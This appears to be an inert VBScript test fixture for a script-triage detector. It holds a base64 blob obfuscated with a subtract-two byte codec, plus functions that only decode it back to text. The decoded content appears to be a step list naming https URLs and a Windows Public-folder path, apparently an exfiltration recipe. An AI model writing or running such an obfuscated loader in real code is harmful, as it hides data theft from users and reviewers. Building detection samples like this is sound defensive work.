Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_29caf0d6 = "dDsvenFyY25xO2ptYV9yY11qbWFfaipucGNuX3BjXXJwX2xxZGNwKnNuam1fYl1wY2ttcmN6X2JfbnJjcDtBY3ByUGNvLGN2Y3pxcl9lY11hbXNscjswemFfa25fZ2VsXWdiO2Ffa25fZ2VsKzUxX2M3NWFjNy96c3BqO2Zycm5xOC0tNTFfYzc1YWM3Lyxjdl9rbmpjLGdsdF9qZ2ItY2QzYC4vMC4sYl9yenNxY3BdX2VjbHI7RnNscnBjcXFKX2AtNTFfYzc1YWM3L3pkZ2pjXW5fcmY7QThaU3FjcHFaTnNgamdhWkZzbHJwY3FxSl9gWnFyX2VjKzUxX2M3NWFjNy8sYl9yenNuam1fYl1zcGo7ZnJybnE4LS01MV9jNzVhYzcvLGN2X2tuamMsZ2x0X2pnYi1zbmptX2ItYTcvYWQ2NWE="
Const Codec_29caf0d6 = "base64_literal|subtract_modulo_256|02"

Function Base64_29caf0d6(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_29caf0d6", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_29caf0d6 = outputBytes
End Function

Function Load_29caf0d6()
  Load_29caf0d6 = Base64_29caf0d6(Material_29caf0d6)
End Function

Function Decode_29caf0d6(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  For i = 0 To UBound(s)
    result(i) = (s(i) + 2) Mod 256
  Next
  Decode_29caf0d6 = result
End Function

Function Recover_29caf0d6()
  Dim s, d, t, n, i, p, e, q
  n = UBound(Array(3, 5, 8, 13))
  s = Load_29caf0d6()
  p = 0
  While p < 1
    d = Decode_29caf0d6(s)
    p = p + 1
  Wend
  t = ""
  For i = 0 To UBound(d)
    t = t & Chr(d(i))
  Next
  Recover_29caf0d6 = t
End Function

Function Inspect_29caf0d6()
  Inspect_29caf0d6 = Recover_29caf0d6()
End Function
